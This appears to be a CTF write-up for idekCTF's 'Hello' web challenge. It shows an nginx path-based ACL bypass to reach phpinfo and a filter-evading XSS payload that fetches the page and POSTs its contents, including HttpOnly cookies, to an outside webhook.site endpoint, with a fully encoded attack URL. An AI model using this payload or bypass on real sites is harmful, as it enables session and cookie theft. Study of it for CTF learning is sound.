---
layout: post
title: idekCTF Web and OSINT Writeup
tags: [ctf, ctf writeup, ctf web, ctf misc, ctf osint, ctf geogussr]
---

## web/Hello

### Solution TLDR

- Bypass XSS characters filter
- Bypass nginx ACL rules for PHP

### Challenge and Solution

Relatively easy challenge, with 161 solves. I built the payload iteratively to bypass the restrictions.

Challenge goal is to get the flag set by the admin bot in the "HttpOnly" cookie. The `index.php` page is XSS-able, and and `info.php` page dumps `phpinfo()`, which shows the cookies in the request, including HttpOnly cookies.

```
location = /info.php {
    allow 127.0.0.1;
    deny all;
}

location ~ \.php$ {
    root           /usr/share/nginx/html;
    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
    include fastcgi_params;  
    fastcgi_pass unix:/var/run/php/php8.2-fpm.sock;
}
```

However, as shown above, `nginx.conf` blocks access to `info.php`, and admin bot cannot acess it either. Referencing to [HackTricks](https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass), it can be bypassed with `http://idek-hello.chal.idek.team:1337/info.php/a.php`, where nginx does not match to `location = /info.php`, instead it matches to `location ~ \.php$` and PHP FPM processes with `info.php`.

```php
function Enhanced_Trim($inp) {
    $trimmed = array("\r", "\n", "\t", "/", " ");
    return str_replace($trimmed, "", $inp);
}

if(isset($_GET['name']))
{
    $name=substr($_GET['name'],0,23);
    echo "Hello, ".Enhanced_Trim($_GET['name']);
}
```

`index.php` is XSS injectable, however it does not allow some characters. It was not able to have `</script>` closing tag, and I did not get `script` tag without closing tag or using `\` instead of `/` in the closing tag work. I used `<img>` tag with `onerror` to make the script to run (`src` attribute was necessary too).

The tag looks like this:

```html
<img src=a onerror="fetch('\\info.php\\a.php').then(r=>r.text()).then(r=>fetch('https:\\\\webhook.site\\[REDACTED]',{method:'POST',body:r}))">
```

The `/` in the URLs above are replaced with `\` to bypass the filter (`\\` because of escape. It was only escaped once in JavaScript, HTML does not use `/` escape), and it still works.

Replacing space `%20` with `%0C` to bypass filter, and the encoded payload for admin bot is below:

```
http://idek-hello.chal.idek.team:1337/?name=%3Cimg%0Csrc%3Da%0Conerror%3D%22fetch%28%27%5C%5Cinfo%2Ephp%5C%5Ca%2Ephp%27%29%2Ethen%28r%3D%3Er%2Etext%28%29%29%2Ethen%28r%3D%3Efetch%28%27https%3A%5C%5C%5C%5Cwebhook%2Esite%5C%5C%5BREDACTED%5D%27%2C%7Bmethod%3A%27POST%27%2Cbody%3Ar%7D%29%29%22%3E%0A
```

## misc/NM~~PZ~~~ (GeoGussr-style)

TODO
